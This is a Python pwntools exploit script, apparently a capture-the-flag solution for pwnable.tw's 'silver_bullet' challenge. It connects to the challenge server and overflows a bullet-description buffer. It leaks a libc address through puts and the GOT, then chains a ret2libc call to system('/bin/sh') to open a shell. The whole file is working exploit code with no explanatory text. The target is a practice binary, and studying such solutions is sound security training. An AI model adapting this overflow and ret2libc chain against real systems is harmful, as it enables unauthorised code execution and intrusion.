#!/usr/bin/env python3

from pwn import *

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdbscript='''
        #    b*0x0804893A
        #    c
        #    ''')
        #input()
    else:
        r = remote("chall.pwnable.tw", 10103)
    return r


def main():
    r = conn()
    
    ## Stage 1: Leak libc addr
    r.sendlineafter(b"choice :", b"1")
    r.sendlineafter(b"description of bullet :", b"A"*47)

    r.sendlineafter(b"choice :", b"2")
    r.sendlineafter(b"another description of bullet :", b"A")



    r.sendlineafter(b"choice :", b"2")
    payload = b"A"*3
    payload += b"B"*4
    payload += p32(exe.plt['puts']) # return address
    payload += p32(exe.sym['main']) # return pointer
    payload += p32(exe.got['puts'])
    #print("payload: ", payload)
    r.sendlineafter(b"another description of bullet :", payload)


    r.sendlineafter(b"choice :", b"3")
    r.sendlineafter(b"choice :", b"3")
    r.recvuntil(b"You win !!\n")
    libc.address = u32(r.recvline()[:-1]) - 0x0005f140
    print("libc: ", hex(libc.address))



    ## Stage 2: Ret2libc
    system = libc.sym['system']           
    binsh = next(libc.search(b'/bin/sh'))
    

    r.sendlineafter(b"choice :", b"1")
    r.sendlineafter(b"description of bullet :", b"A"*47)

    r.sendlineafter(b"choice :", b"2")
    r.sendlineafter(b"another description of bullet :", b"A")



    r.sendlineafter(b"choice :", b"2")
    payload = b"A"*3
    payload += b"B"*4
    payload += p32(system) # return address
    payload += p32(0x31313131) # return pointer
    payload += p32(binsh)
    #print("payload: ", payload)
    r.sendlineafter(b"another description of bullet :", payload)


    r.sendlineafter(b"choice :", b"3")
    r.sendlineafter(b"choice :", b"3")


    # good luck pwning :)
    r.interactive()


if __name__ == "__main__":
    main()
